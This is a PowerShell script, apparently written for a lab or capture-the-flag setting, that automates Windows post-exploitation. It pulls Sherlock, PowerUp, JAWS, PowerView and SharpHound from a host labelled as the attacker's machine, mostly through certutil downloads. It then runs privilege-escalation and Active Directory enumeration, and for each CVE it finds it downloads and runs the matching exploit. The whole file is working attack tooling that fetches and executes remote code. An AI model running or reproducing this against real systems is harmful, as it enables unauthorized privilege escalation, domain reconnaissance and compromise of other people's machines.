$VerbosePreference = "Continue"

# Hardcoded paths and settings
$OutputFile = "C:\\Temp\\Shellshock\\shellshocks_security_checks.txt"
$ToolDownloadDir = "C:\\Temp\\Shellshock"
$SharpHoundOutputDir = "C:\\Temp\\Shellshock\\Bloodhound"
$SharpHoundZipFile = "C:\\Temp\\Shellshock\\ShellHound.zip"
$CveDatabasePath = "C:\\Temp\\Shellshock\\win_trading.ps1"
$AttackerMachine = "http://10.10.14.2:8000"  # Base URL of the attacker's machine

# Function: Get-DomainName
function Get-DomainName {
    try {
        $domain = (Get-WmiObject Win32_NTDomain).DomainName
        Write-Host "Domain Name: $domain"
        return $domain
    } catch {
        Write-Host "Failed to retrieve domain name" -ForegroundColor Red
        return "UnknownDomain"
    }
}

# Function: Ensure-Directory
function Ensure-Directory {
    param([string]$path)
    if (-Not (Test-Path $path)) {
        Write-Verbose "Directory $path does not exist. Creating it..."
        New-Item -Path $path -ItemType Directory | Out-Null
        Write-Host "Created directory: $path" -ForegroundColor Green
    } else {
        Write-Verbose "Directory $path already exists."
    }
}

# Ensure the directories for the script
Ensure-Directory -path $ToolDownloadDir   # Ensure C:\Temp\Shellshock exists
Ensure-Directory -path $SharpHoundOutputDir  # Ensure C:\Temp\Shellshock\Bloodhound exists

# Function: Transfer-Methods
function Transfer-Methods {
    param(
        [string]$url,
        [string]$filename,
        [string]$downloadMethod
    )

    # Check if the file already exists
    if (Test-Path $filename) {
        Write-Host "$filename already exists, skipping download..." -ForegroundColor Green
        return $true
    }

    Write-Verbose "Starting download for $filename using method: $downloadMethod from $url..."

    # Switch on download method to provide more customized control
    switch ($downloadMethod) {
        "invokewebrequest" {
            try {
                Invoke-WebRequest -Uri $url -OutFile $filename -ErrorAction Stop
                Write-Host "$filename downloaded using Invoke-WebRequest." -ForegroundColor Green
                return $true
            } catch {
                Write-Host "Invoke-WebRequest failed." -ForegroundColor Red
            }
        }
        "wget" {
            try {
                wget $url -O $filename -ErrorAction Stop
                Write-Host "$filename downloaded using wget." -ForegroundColor Green
                return $true
            } catch {
                Write-Host "wget failed." -ForegroundColor Red
            }
        }
        "curl" {
            try {
                curl $url -o $filename -ErrorAction Stop
                Write-Host "$filename downloaded using curl." -ForegroundColor Green
                return $true
            } catch {
                Write-Host "curl failed." -ForegroundColor Red
            }
        }
        "certutil" {
            try {
                certutil.exe -urlcache -split -f $url $filename
                Write-Host "$filename downloaded using certutil." -ForegroundColor Green
                return $true
            } catch {
                Write-Host "certutil failed." -ForegroundColor Red
            }
        }
        default {
            Write-Host "Invalid download method specified for $filename." -ForegroundColor Red
            return $false
        }
    }

    Write-Verbose "Completed download attempt for $filename"
}

# Check if win_trading.ps1 exists, download if not
if (-Not (Test-Path $CveDatabasePath)) {
    Write-Host "CVE Database not found at $CveDatabasePath. Downloading..." -ForegroundColor Red
    $cveDatabaseUrl = "$AttackerMachine/win_trading.ps1"
    Transfer-Methods -url $cveDatabaseUrl -filename $CveDatabasePath -downloadMethod "certutil"
    if (-Not (Test-Path $CveDatabasePath)) {
        Write-Host "Failed to download the CVE database. Exiting." -ForegroundColor Red
        Exit
    }
}

Write-Verbose "Loading CVE database from $CveDatabasePath..."
. $CveDatabasePath  # Load the win_trading.ps1 database

# Function: Run-Tool (updated to handle dynamic SharpHound execution)
function Run-Tool {
    param([hashtable]$toolConfig, [string]$outputFile)

    $scriptPath = "$ToolDownloadDir\$($toolConfig.Filename)"
    Write-Host "Running $($toolConfig.Name)..." -ForegroundColor Cyan
    Write-Verbose "Executing tool from $scriptPath..."

    $separator = "`n=====================================================`n"
    Add-Content -Path $outputFile -Value "$separator$($toolConfig.Name) results:$separator"

    # Execute each tool with its unique method
    switch ($toolConfig.Name) {
        "Sherlock" {
            . $scriptPath
            $result = Find-AllVulns 2>&1  # Logs both output and errors
        }
        "PowerUp" {
            . $scriptPath
            $result = Invoke-AllChecks 2>&1  # Logs both output and errors
        }
        "JAWS" {
            $result = & $scriptPath 2>&1  # Executes JAWS and logs both output and errors
        }
        "PowerView" {
            . $scriptPath
            $result = Get-NetUser 2>&1  # Replace with relevant PowerView commands, logs both output and errors
        }
        "SharpHound" {
            $domainName = Get-DomainName
            $zipFileName = "C:\\Temp\\Shellshock\\$domainName.zip"
            $result = & $scriptPath --CollectionMethods All --zipfilename $zipFileName 2>&1  # Logs both output and errors
            Write-Host "SharpHound completed. Output saved as $zipFileName" -ForegroundColor Green
            $result += "`nSharpHound executed and output saved to $zipFileName"
        }
        default {
            Write-Host "Unknown tool: $($toolConfig.Name)" -ForegroundColor Red
            $result = "Unknown tool"
        }
    }

    if (-not $result) {
        $result = "No output generated by $($toolConfig.Name)."
    }

    # Append all output (including errors) to the log file
    $result | Out-File -Append -FilePath $outputFile
    Write-Host "$($toolConfig.Name) completed and output saved." -ForegroundColor Green

    Write-Verbose "Completed execution for $($toolConfig.Name)"
}

# Function: Check-CVE
function Check-CVE {
    param([string]$outputFile)

    Write-Verbose "Checking CVEs in $outputFile"
    $outputContent = Get-Content -Path $outputFile
    $easyWinsPath = "C:\\Temp\\Shellshock\\easy_wins.txt"
    $easyWins = @()

    foreach ($line in $outputContent) {
        if ($line -match "CVE-([0-9]{4}-[0-9]+)") {
            $cve = $matches[1]
            Write-Host "Detected CVE: $cve" -ForegroundColor Yellow

            $cveInfo = Get-CVE-Info -cve $cve
            if ($cveInfo) {
                Write-Host "Downloading and executing exploit for $cve" -ForegroundColor Red
                $exploitPath = "$ToolDownloadDir\$($cveInfo.Filename)"
                Transfer-Methods -url $cveInfo.DownloadURL -filename $exploitPath -downloadMethod "certutil"
                Run-Tool -toolConfig $cveInfo -outputFile $outputFile
                $easyWins += $cveInfo
            } else {
                Write-Host "No action found for $cve in the database." -ForegroundColor Cyan
            }
        }
    }

    if ($easyWins.Count -gt 0) {
        $easyWins | ForEach-Object {
            Add-Content -Path $easyWinsPath -Value "CVE: $($_.CVE) - $($_.Description) - KB: $($_.KB)"
        }
        Write-Host "Easy wins saved to $easyWinsPath" -ForegroundColor Green
    }

    Write-Verbose "Completed CVE check for $outputFile"
}

# Define the tools with their specific details
$tools = @(
    @{ Name = "Sherlock"; URL = "$AttackerMachine/Sherlock.ps1"; Filename = "Sherlock.ps1"; Execute = "module"; DownloadMethod = "certutil" },
    @{ Name = "PowerUp"; URL = "$AttackerMachine/PowerUp.ps1"; Filename = "PowerUp.ps1"; Execute = "module"; DownloadMethod = "certutil" },
    @{ Name = "JAWS"; URL = "$AttackerMachine/jaws-enum.ps1"; Filename = "jaws-enum.ps1"; Execute = "script"; DownloadMethod = "certutil" },
    @{ Name = "PowerView"; URL = "$AttackerMachine/PowerView.ps1"; Filename = "PowerView.ps1"; Execute = "script"; DownloadMethod = "certutil" },
    @{ Name = "SharpHound"; URL = "$AttackerMachine/SharpHound.exe"; Filename = "SharpHound.exe"; Execute = "exe"; DownloadMethod = "certutil" }
)

Write-Host "Starting security checks..." -ForegroundColor Cyan
Write-Verbose "Total tools to execute: $($tools.Count)"

# Total number of tools
$totalTools = $tools.Count
$currentTool = 0

# Ensure the tool download directory exists
Ensure-Directory -path $ToolDownloadDir

# Download all the tools if they are not already present
foreach ($tool in $tools) {
    $toolFile = "$ToolDownloadDir\$($tool.Filename)"
    Transfer-Methods -url $tool.URL -filename $toolFile -downloadMethod $tool.DownloadMethod
}

# Run each tool and save the results to the log file with progress
foreach ($tool in $tools) {
    $currentTool++

    # Show the progress bar
    Write-Progress -Activity "Running Tools" `
                   -Status "Running $($tool.Name)" `
                   -PercentComplete (($currentTool / $totalTools) * 100)

    # Run the tool
    Run-Tool -toolConfig $tool -outputFile $OutputFile
}

# Perform the CVE check based on win_trading.ps1
Check-CVE -outputFile $OutputFile

Write-Host "All security checks are complete. Results saved to $OutputFile." -ForegroundColor Green
